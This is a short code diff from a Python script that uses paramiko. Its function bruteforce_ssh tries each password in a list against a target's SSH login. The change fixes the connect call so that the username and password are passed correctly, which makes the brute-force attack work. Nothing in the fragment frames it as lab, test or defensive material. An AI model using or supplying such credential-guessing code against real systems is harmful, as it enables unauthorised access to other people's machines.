@@ -14,7 +14,7 @@ ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 def bruteforce_ssh(target, username,  pwds):
     for pwd in pwds:
         try:
-            ssh.connect(target, username=pwd, timeout=5)
+            ssh.connect(target, username=username, password=pwd)
         except Exception as e:
             continue
         print(f"You have successfully connected to {target}!")
